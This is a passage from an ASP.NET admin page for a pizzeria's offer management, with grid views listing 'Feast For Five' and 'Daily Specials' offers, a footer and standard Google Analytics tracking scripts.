                                    <asp:TextBox ID="txtFeastForFiveSearch" placeholder="Search" CssClass="form-control" runat="server" ClientIDMode="Static" onfocus="this.placeholder=''" onblur="this.placeholder='Search'" Width="402px"></asp:TextBox>
                                    <asp:Button ID="btnFeastForFiveSearch" class="btn btn-info" runat="server" Text="Search" Style="margin-left: 428px; margin-top: -58px;" OnClick="btnFeastForFiveSearch_Click" />
                                    <asp:Button ID="btnResetFeastForFiveSearch" class="btn btn-info" runat="server" Text="Reset" OnClick="btnResetFeastForFiveSearch_Click" Style="margin-top: -58px;" />
                                </div>
                            </div>
                        </div>
                        <div class="panel-body">
                            <asp:UpdatePanel ID="UpFeastForFiveOffer" runat="server">
                                <ContentTemplate>
                                    <asp:GridView ID="gvFeastForFiveOffer" runat="server" ShowHeaderWhenEmpty="true" AutoGenerateColumns="false" AllowSorting="true" class="table table-bordered table-striped datatable editable-datatable responsive align-middle bordered" PageSize="10" AllowPaging="true" OnRowCommand="gvFeastForFiveOffer_RowCommand" OnRowDataBound="gvFeastForFiveOffer_RowDataBound" Style="margin-top: 25px;">
                                        <RowStyle HorizontalAlign="Left" />
                                        <HeaderStyle HorizontalAlign="Left" />
                                        <Columns>
                                            <asp:TemplateField Visible="false">
                                                <ItemTemplate>
                                                    <asp:Label ID="lblFeastForFiveOfferId" runat="server" Text='<%# Eval("FeastForFiveOfferId") %>'></asp:Label>
                                                </ItemTemplate>
                                            </asp:TemplateField>

                                            <%--<asp:TemplateField HeaderText="Feast For Five Offer Name" SortExpression="FeastForFiveOfferName">
                                                <ItemTemplate>
                                                    <asp:Label ID="lblFeastForFiveOfferName" runat="server" Text='<%# Eval("FeastForFiveOfferName") %>'></asp:Label>

                                                </ItemTemplate>
                                            </asp:TemplateField>--%>

                                            <asp:TemplateField HeaderText="Feast For Five Offer Description" SortExpression="FeastForFiveDescription">
                                                <ItemTemplate>
                                                    <asp:Label ID="lblFeastForFiveDescription" runat="server" Text='<%# Eval("FeastForFiveDescription") %>' ToolTip='<%# Eval("FeastForFiveDescription") %>'></asp:Label>

                                                </ItemTemplate>
                                            </asp:TemplateField>

                                            <asp:TemplateField HeaderText="Feast For Five Offer Code" SortExpression="FeastForFiveOfferCode">
                                                <ItemTemplate>
                                                    <asp:Label ID="lblFeastForFiveOfferCode" runat="server" Text='<%# Eval("FeastForFiveOfferCode") %>'></asp:Label>

                                                </ItemTemplate>
                                            </asp:TemplateField>

                                            <asp:TemplateField Visible="false">
                                                <ItemTemplate>
                                                    <asp:Label ID="lblProduct1Id" runat="server" Text='<%# Eval("Product1Id") %>'></asp:Label>
                                                </ItemTemplate>
                                            </asp:TemplateField>
                                            <asp:TemplateField HeaderText="Product1 Name" SortExpression="Product1Name">
                                                <ItemTemplate>
                                                    <asp:Label ID="lblProduct1Name" runat="server" Text='<%# Eval("Product1Name") %>'></asp:Label>

                                                </ItemTemplate>
                                            </asp:TemplateField>

                                            <asp:TemplateField Visible="false">
                                                <ItemTemplate>
                                                    <asp:Label ID="lblProduct1SizeId" runat="server" Text='<%# Eval("Product1SizeId") %>'></asp:Label>
                                                </ItemTemplate>
                                            </asp:TemplateField>

                                            <asp:TemplateField HeaderText="Product1 Size Name" SortExpression="Product1SizeName">
                                                <ItemTemplate>
                                                    <asp:Label ID="lblProduct1SizeName" runat="server" Text='<%# Eval("Product1SizeName") %>'></asp:Label>

                                                </ItemTemplate>
                                            </asp:TemplateField>

                                            <asp:TemplateField HeaderText="Product1 Quantity" SortExpression="Product1Quantity">
                                                <ItemTemplate>
                                                    <asp:Label ID="lblProduct1Quantity" runat="server" Text='<%# Eval("Product1Quantity") %>'></asp:Label>

                                                </ItemTemplate>
                                            </asp:TemplateField>

                                            <asp:TemplateField Visible="false">
                                                <ItemTemplate>
                                                    <asp:Label ID="lblProduct2Id" runat="server" Text='<%# Eval("Product2Id") %>'></asp:Label>
                                                </ItemTemplate>
                                            </asp:TemplateField>
                                            <asp:TemplateField HeaderText="Product2 Name" SortExpression="Product2Name">
                                                <ItemTemplate>
                                                    <asp:Label ID="lblProduct2Name" runat="server" Text='<%# Eval("Product2Name") %>'></asp:Label>

                                                </ItemTemplate>
                                            </asp:TemplateField>
                                            <asp:TemplateField HeaderText="Product2 Quantity" SortExpression="Product2Quantity">
                                                <ItemTemplate>
                                                    <asp:Label ID="lblProduct2Quantity" runat="server" Text='<%# Eval("Product2Quantity") %>'></asp:Label>

                                                </ItemTemplate>
                                            </asp:TemplateField>


                                            <asp:TemplateField Visible="false">
                                                <ItemTemplate>
                                                    <asp:Label ID="lblProduct3Id" runat="server" Text='<%# Eval("Product3Id") %>'></asp:Label>
                                                </ItemTemplate>
                                            </asp:TemplateField>
                                            <asp:TemplateField HeaderText="Product3 Name" SortExpression="Product3Name">
                                                <ItemTemplate>
                                                    <asp:Label ID="lblProduct3Name" runat="server" Text='<%# Eval("Product3Name") %>'></asp:Label>

                                                </ItemTemplate>
                                            </asp:TemplateField>
                                            <asp:TemplateField HeaderText="Product3 Quantity" SortExpression="Prodcut3Quantity">
                                                <ItemTemplate>
                                                    <asp:Label ID="lblProdcut3Quantity" runat="server" Text='<%# Eval("Prodcut3Quantity") %>'></asp:Label>

                                                </ItemTemplate>
                                            </asp:TemplateField>


                                            <asp:TemplateField HeaderText="Offer Amount" SortExpression="OfferAmount">
                                                <ItemTemplate>
                                                    <asp:Label ID="lblOfferAmount" runat="server" Text='<%# "$ " + Eval("OfferAmount") %>'></asp:Label>

                                                </ItemTemplate>
                                            </asp:TemplateField>

                                            <asp:TemplateField HeaderText="Offer Start Date" SortExpression="Offerstartdatestring">
                                                <ItemTemplate>
                                                    <asp:Label ID="lblOfferStartDate" runat="server" Text='<%# Eval("Offerstartdatestring") %>'></asp:Label>

                                                </ItemTemplate>
                                            </asp:TemplateField>

                                            <asp:TemplateField HeaderText="Offer End Date" SortExpression="Offerenddatestring">
                                                <ItemTemplate>
                                                    <asp:Label ID="lblOfferEndDate" runat="server" Text='<%# Eval("Offerenddatestring") %>'></asp:Label>

                                                </ItemTemplate>
                                            </asp:TemplateField>

                                            <asp:TemplateField HeaderText="Edit" HeaderStyle-Width="2%">
                                                <ItemTemplate>
                                                    <asp:LinkButton ID="lnkEdit" runat="server" CommandName="EditFeastForFiveOffer" CommandArgument='<%# Eval("FeastForFiveOfferId")%>' Text="Edit"></asp:LinkButton>
                                                </ItemTemplate>
                                            </asp:TemplateField>

                                            <asp:TemplateField HeaderText="Delete" HeaderStyle-Width="3%">
                                                <ItemTemplate>
                                                    <asp:LinkButton ID="lnkDelete" runat="server" CommandName="DeleteFeastForFiveOffer" CommandArgument='<%# Eval("FeastForFiveOfferId")%>' Text="Delete" OnClientClick="Confirm()"></asp:LinkButton>
                                                </ItemTemplate>
                                            </asp:TemplateField>


                                        </Columns>
                                        <PagerTemplate>
                                            <ul class="pagination pull-right">
                                                <asp:Button ID="btnFirst" runat="server" Text="First" CssClass="btn btn-info" CommandName="First" /></li>
                                              
                                                    <asp:Button ID="btnPrevious" runat="server" Text="Previous" CssClass="btn btn-info" CommandName="Previous" /></li>
                                               
                                                    <asp:Button ID="btnNext" runat="server" Text="Next" CssClass="btn btn-info" CommandName="Next" /></li>
                                               
                                                    <asp:Button ID="btnLast" runat="server" Text="Last" CssClass="btn btn-info" CommandName="Last" /></li>
                                          
                                            </ul>
                                        </PagerTemplate>
                                        <EmptyDataTemplate>
                                            No Feast For Five Offer Found
                                        </EmptyDataTemplate>
                                    </asp:GridView>
                                </ContentTemplate>
                            </asp:UpdatePanel>

                        </div>

                    </div>
                </div>
            </div>

            <div class="main-panel" style="background-color: #F0F0F0; height: 100%; width: 85%; margin-top: -120px;">
                <header class="header navbar">
                    <div class="brand visible-xs">
                        <div class="toggle-offscreen"><a href="#" class="hamburger-icon visible-xs" data-toggle="offscreen" data-move="ltr"><span></span><span></span><span></span></a></div>
                        <div class="brand-logo">
                            <img src="images/logo-dark.5ba260bb.png" height="15" alt="">
                        </div>
                        <div class="toggle-chat"><a href="javascript:;" class="hamburger-icon v2 visible-xs" data-toggle="layout-chat-open"><span></span><span></span><span></span></a></div>
                    </div>
                    <ul class="nav navbar-nav navbar-right hidden-xs">
                        <li><a href="javascript:;" data-toggle="dropdown">
                            <img src="images/user.png" class="header-avatar img-circle ml10" alt="user" title="user">
                            <span class="pull-left" onclick="ConfirmForLogOut();">LogOut</span> </a></li>
                    </ul>
                </header>

                <div class="main-content">
                    <div class="panel">

                        <div class="table-header">
                            <div class="col-md-6">
                                <div class="col-md-8 col-sm-6">
                                    <div role="form">
                                        <div class="form-group" style="font-size: medium; font-weight: bold;">
                                            Daily Specials Offer Information
                                            <%--Show
                                    
                                            <asp:DropDownList ID="ddlShowData" CssClass="dropdown" Width="55px" runat="server" AutoPostBack="true" OnSelectedIndexChanged="ddlShowData_SelectedIndexChanged">
                                                <asp:ListItem>5</asp:ListItem>
                                                <asp:ListItem>10</asp:ListItem>
                                                <asp:ListItem>15</asp:ListItem>
                                            </asp:DropDownList>--%>
                                        </div>
                                    </div>
                                </div>
                                <div>
                                    <asp:Button ID="btnAddDailySpecialsOffer" class="btn btn-info" runat="server" Text="Add New Daily Specials Offer" OnClick="btnAddDailySpecialsOffer_Click" />

                                </div>
                            </div>

                            <div class="col-md-6 search-bar">
                                <div>
                                    <asp:TextBox ID="txtDailySpecialsSearch" placeholder="Search" CssClass="form-control" runat="server" ClientIDMode="Static" onfocus="this.placeholder=''" onblur="this.placeholder='Search'" Width="402px"></asp:TextBox>
                                    <asp:Button ID="btnDailySpecialsSearch" class="btn btn-info" runat="server" Text="Search" Style="margin-left: 428px; margin-top: -58px;" OnClick="btnDailySpecialsSearch_Click" />
                                    <asp:Button ID="btnResetDaiySpecialSearch" class="btn btn-info" runat="server" Text="Reset" OnClick="btnResetDaiySpecialSearch_Click" Style="margin-top: -58px;" />
                                </div>
                            </div>
                        </div>
                        <div class="panel-body">
                            <asp:UpdatePanel ID="UpDailySpecialsOffer" runat="server">
                                <ContentTemplate>
                                    <asp:GridView ID="gvDailySpecialsOffer" runat="server" ShowHeaderWhenEmpty="true" AutoGenerateColumns="false" AllowSorting="true" class="table table-bordered table-striped datatable editable-datatable responsive align-middle bordered" PageSize="10" AllowPaging="true" OnRowCommand="gvDailySpecialsOffer_RowCommand" OnRowDataBound="gvDailySpecialsOffer_RowDataBound" Style="margin-top: 25px;">
                                        <RowStyle HorizontalAlign="Left" />
                                        <HeaderStyle HorizontalAlign="Left" />
                                        <Columns>
                                            <asp:TemplateField Visible="false">
                                                <ItemTemplate>
                                                    <asp:Label ID="lblDailySpecialsOfferId" runat="server" Text='<%# Eval("DailySpecialsOfferId") %>'></asp:Label>
                                                </ItemTemplate>
                                            </asp:TemplateField>

                                            <%-- <asp:TemplateField HeaderText="Daily Specials Offer Name" SortExpression="DailySpecialOfferName">
                                                <ItemTemplate>
                                                    <asp:Label ID="lblDailySpecialOfferName" runat="server" Text='<%# Eval("DailySpecialOfferName") %>'></asp:Label>

                                                </ItemTemplate>
                                            </asp:TemplateField>--%>

                                            <asp:TemplateField HeaderText="Daily Specials Offer Description" SortExpression="DailySpecialOfferDescription">
                                                <ItemTemplate>
                                                    <asp:Label ID="lblDailySpecialOfferDescription" runat="server" Text='<%# Eval("DailySpecialOfferDescription") %>' ToolTip='<%# Eval("DailySpecialOfferDescription") %>'></asp:Label>

                                                </ItemTemplate>
                                            </asp:TemplateField>

                                            <asp:TemplateField HeaderText="Daily Specials Offer Code" SortExpression="DailySpecialOfferCode">
                                                <ItemTemplate>
                                                    <asp:Label ID="lblDailySpecialOfferCode" runat="server" Text='<%# Eval("DailySpecialOfferCode") %>'></asp:Label>

                                                </ItemTemplate>
                                            </asp:TemplateField>

                                            <asp:TemplateField Visible="false">
                                                <ItemTemplate>
                                                    <asp:Label ID="lblDailySpecialDay" runat="server" Text='<%# Eval("DailySpecialDay") %>'></asp:Label>
                                                </ItemTemplate>
                                            </asp:TemplateField>
                                            <asp:TemplateField HeaderText="Day Name" SortExpression="DailySpecialDayName">
                                                <ItemTemplate>
                                                    <asp:Label ID="lblDailySpecialDayName" runat="server" Text='<%# Eval("DailySpecialDayName") %>'></asp:Label>

                                                </ItemTemplate>
                                            </asp:TemplateField>

                                            <asp:TemplateField Visible="false">
                                                <ItemTemplate>
                                                    <asp:Label ID="lblProduct1Id" runat="server" Text='<%# Eval("Product1Id") %>'></asp:Label>
                                                </ItemTemplate>
                                            </asp:TemplateField>
                                            <asp:TemplateField HeaderText="Product1 Name" SortExpression="Product1Name">
                                                <ItemTemplate>
                                                    <asp:Label ID="lblProduct1Name" runat="server" Text='<%# Eval("Product1Name") %>'></asp:Label>

                                                </ItemTemplate>
                                            </asp:TemplateField>

                                            <asp:TemplateField Visible="false">
                                                <ItemTemplate>
                                                    <asp:Label ID="lblProduct1SizeId" runat="server" Text='<%# Eval("Product1SizeId") %>'></asp:Label>
                                                </ItemTemplate>
                                            </asp:TemplateField>

                                            <asp:TemplateField HeaderText="Product1 Size Name" SortExpression="Product1SizeName">
                                                <ItemTemplate>
                                                    <asp:Label ID="lblProduct1SizeName" runat="server" Text='<%# Eval("Product1SizeName") %>'></asp:Label>

                                                </ItemTemplate>
                                            </asp:TemplateField>

                                            <asp:TemplateField HeaderText="Product1 Quantity" SortExpression="Product1Quantity">
                                                <ItemTemplate>
                                                    <asp:Label ID="lblProduct1Quantity" runat="server" Text='<%# Eval("Product1Quantity") %>'></asp:Label>

                                                </ItemTemplate>
                                            </asp:TemplateField>

                                            <asp:TemplateField Visible="false">
                                                <ItemTemplate>
                                                    <asp:Label ID="lblProduct2Id" runat="server" Text='<%# Eval("Product2Id") %>'></asp:Label>
                                                </ItemTemplate>
                                            </asp:TemplateField>
                                            <asp:TemplateField HeaderText="Product2 Name" SortExpression="Product2Name">
                                                <ItemTemplate>
                                                    <asp:Label ID="lblProduct2Name" runat="server" Text='<%# Eval("Product2Name") %>'></asp:Label>

                                                </ItemTemplate>
                                            </asp:TemplateField>

                                            <asp:TemplateField Visible="false">
                                                <ItemTemplate>
                                                    <asp:Label ID="lblProduct2SizeId" runat="server" Text='<%# Eval("Product2SizeId") %>'></asp:Label>
                                                </ItemTemplate>
                                            </asp:TemplateField>

                                            <asp:TemplateField HeaderText="Product2 Size Name" SortExpression="Product2SizeName">
                                                <ItemTemplate>
                                                    <asp:Label ID="lblProduct2SizeName" runat="server" Text='<%# Eval("Product2SizeName") %>'></asp:Label>

                                                </ItemTemplate>
                                            </asp:TemplateField>

                                            <asp:TemplateField HeaderText="Product2 Quantity" SortExpression="Product2Quantity">
                                                <ItemTemplate>
                                                    <asp:Label ID="lblProduct2Quantity" runat="server" Text='<%# Eval("Product2Quantity") %>'></asp:Label>

                                                </ItemTemplate>
                                            </asp:TemplateField>


                                            <asp:TemplateField HeaderText="Offer Amount" SortExpression="OfferAmount">
                                                <ItemTemplate>
                                                    <asp:Label ID="lblOfferAmount" runat="server" Text='<%# "$ " + Eval("OfferAmount") %>'></asp:Label>

                                                </ItemTemplate>
                                            </asp:TemplateField>

                                            <asp:TemplateField HeaderText="Offer Start Date" SortExpression="Offerstartdatestring">
                                                <ItemTemplate>
                                                    <asp:Label ID="lblOfferStartDate" runat="server" Text='<%# Eval("Offerstartdatestring") %>'></asp:Label>

                                                </ItemTemplate>
                                            </asp:TemplateField>

                                            <asp:TemplateField HeaderText="Offer End Date" SortExpression="Offerenddatestring">
                                                <ItemTemplate>
                                                    <asp:Label ID="lblOfferEndDate" runat="server" Text='<%# Eval("Offerenddatestring") %>'></asp:Label>

                                                </ItemTemplate>
                                            </asp:TemplateField>

                                            <asp:TemplateField HeaderText="Edit" HeaderStyle-Width="2%">
                                                <ItemTemplate>
                                                    <asp:LinkButton ID="lnkEdit" runat="server" CommandName="EditDailySpecialsOffer" CommandArgument='<%# Eval("DailySpecialsOfferId")%>' Text="Edit"></asp:LinkButton>
                                                </ItemTemplate>
                                            </asp:TemplateField>

                                            <asp:TemplateField HeaderText="Delete" HeaderStyle-Width="3%">
                                                <ItemTemplate>
                                                    <asp:LinkButton ID="lnkDelete" runat="server" CommandName="DeleteDailySpecialsOffer" CommandArgument='<%# Eval("DailySpecialsOfferId")%>' Text="Delete" OnClientClick="Confirm()"></asp:LinkButton>
                                                </ItemTemplate>
                                            </asp:TemplateField>


                                        </Columns>
                                        <PagerTemplate>
                                            <ul class="pagination pull-right">
                                                <asp:Button ID="btnFirst" runat="server" Text="First" CssClass="btn btn-info" CommandName="First" /></li>
                                              
                                                    <asp:Button ID="btnPrevious" runat="server" Text="Previous" CssClass="btn btn-info" CommandName="Previous" /></li>
                                               
                                                    <asp:Button ID="btnNext" runat="server" Text="Next" CssClass="btn btn-info" CommandName="Next" /></li>
                                               
                                                    <asp:Button ID="btnLast" runat="server" Text="Last" CssClass="btn btn-info" CommandName="Last" /></li>
                                          
                                            </ul>
                                        </PagerTemplate>
                                        <EmptyDataTemplate>
                                            No Daily Specials Offer Found
                                        </EmptyDataTemplate>
                                    </asp:GridView>
                                </ContentTemplate>
                            </asp:UpdatePanel>

                        </div>

                    </div>
                </div>
            </div>

            <br />
            <br />


            <footer class="content-footer" style="width: 90%;">
                <nav class="footer-right">
                    <ul class="nav">
                        <li><a href="javascript:;">Top</a> </li>
                        <li><a href="javascript:;" class="scroll-up"><i class="fa fa-angle-up"></i></a></li>
                    </ul>
                </nav>

                <nav class="footer-left">
                    <ul class="nav">
                        <li><a href="javascript:;">Copyright <i class="fa fa-copyright"></i><span>TomatosPizzeria</span> 2016. All rights reserved</a> </li>
                    </ul>
                </nav>
            </footer>
        </div>
        <script src="js/app.min.4fc8dd6e.js"></script>
        <script src="js/jquery.dataTables.js"></script>
        <script src="js/bootstrap-datatables.8df42543.js"></script>
        <script src="js/table-edit.adb541fe.js"></script>
        <script type="text/javascript">
            /* <![CDATA[ */
            var _gaq = _gaq || [];
            _gaq.push(['_setAccount', 'UA-50530436-1']);
            _gaq.push(['_trackPageview']);

            (function () {
                var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
                ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
                var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
            })();

            (function (b) { (function (a) { "__CF" in b && "DJS" in b.__CF ? b.__CF.DJS.push(a) : "addEventListener" in b ? b.addEventListener("load", a, !1) : b.attachEvent("onload", a) })(function () { "FB" in b && "Event" in FB && "subscribe" in FB.Event && (FB.Event.subscribe("edge.create", function (a) { _gaq.push(["_trackSocial", "facebook", "like", a]) }), FB.Event.subscribe("edge.remove", function (a) { _gaq.push(["_trackSocial", "facebook", "unlike", a]) }), FB.Event.subscribe("message.send", function (a) { _gaq.push(["_trackSocial", "facebook", "send", a]) })); "twttr" in b && "events" in twttr && "bind" in twttr.events && twttr.events.bind("tweet", function (a) { if (a) { var b; if (a.target && a.target.nodeName == "IFRAME") a: { if (a = a.target.src) { a = a.split("#")[0].match(/[^?=&]+=([^&]*)?/g); b = 0; for (var c; c = a[b]; ++b) if (c.indexOf("url") === 0) { b = unescape(c.split("=")[1]); break a } } b = void 0 } _gaq.push(["_trackSocial", "twitter", "tweet", b]) } }) }) })(window);
            /* ]]> */
        </script>
    </form>
</body>
</html>

